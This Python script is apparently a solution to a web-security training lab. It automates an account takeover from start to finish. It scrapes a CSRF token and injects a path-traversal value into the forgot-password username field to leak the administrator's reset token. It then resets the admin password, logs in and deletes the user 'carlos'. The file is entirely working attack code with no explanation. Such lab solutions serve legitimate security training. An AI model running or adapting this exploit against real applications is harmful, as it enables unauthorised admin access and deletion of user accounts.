import requests 
from bs4 import BeautifulSoup
import sys
import json



def check_url(raw_url):

    return raw_url.rstrip('/')


def get_csrf_token(url, session):

    response = session.get(url)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, "html.parser")
        result = soup.find("input", {"name": "csrf"})

        if result:
            print("CSRF Token : " + result["value"])
            return result["value"]
        else:
            print("[!] CSRF token not found!")
            sys.exit(1)            
    
    else:
        print("web request error.")
        sys.exit(1)


def get_pwd_reset_token(forget_password_url, csrf_token, session):

    data = {
        'csrf': csrf_token,
        'username': '../../v1/users/administrator/field/passwordResetToken%23'
    }

    response = session.post(forget_password_url, data = data)

    response_json = json.loads(response.text)

    if "error" in response.text:
        print("[!] Get passwordResetToken error. \n" + response_json["error"])
        sys.exit(1)

    print("passwordResetToken : " + response_json["result"])

    pwd_reset_token = response_json["result"]
    return pwd_reset_token


def reset_admin_password(forget_password_url, csrf_token, pwd_reset_token):

    reset_pwd_url = forget_password_url + '?passwordResetToken=' + pwd_reset_token

    data = {
        'csrf': csrf_token,
        'passwordResetToken': pwd_reset_token,
        'new-password-1': 'password123',
        'new-password-2': 'password123'
    }

    response = session.post(reset_pwd_url, data = data, allow_redirects = False)

    if response.status_code == 302 and '/' in response.headers["Location"] :
        print("Password change successfully.")
    else:
        print("Password change failed.")
        sys.exit(1)


def admin_login(base_url, csrf_token, session):

    login_url = base_url + '/login'

    data = {
        'csrf': csrf_token,
        'username': 'administrator',
        'password': 'password123'
    }

    response = session.post(login_url, data = data, allow_redirects = False)

    if response.status_code == 302 and '/my-account' in response.headers['Location'] :
        print("login successfully.")
    else:
        print("login failed.")
        print(response.status_code,response.headers) 
        sys.exit(1)


def delete_carlos(base_url, session):

    delete_carlos_url = base_url + '/admin/delete?username=carlos'

    response = session.get(delete_carlos_url)

    print(response.status_code)

    if response.status_code == 200:
        print("carlos delete successfully.")
    else:
        print("user delete failed.")
        sys.exit(1)


session = requests.Session()

args = sys.argv[1:]
base_url = check_url(args[0])
forget_password_url = base_url + '/forgot-password'

csrf_token = get_csrf_token(forget_password_url, session)
pwd_reset_token = get_pwd_reset_token(forget_password_url, csrf_token, session)
reset_admin_password(forget_password_url, csrf_token, pwd_reset_token)
admin_login(base_url, csrf_token, session)
delete_carlos(base_url, session)
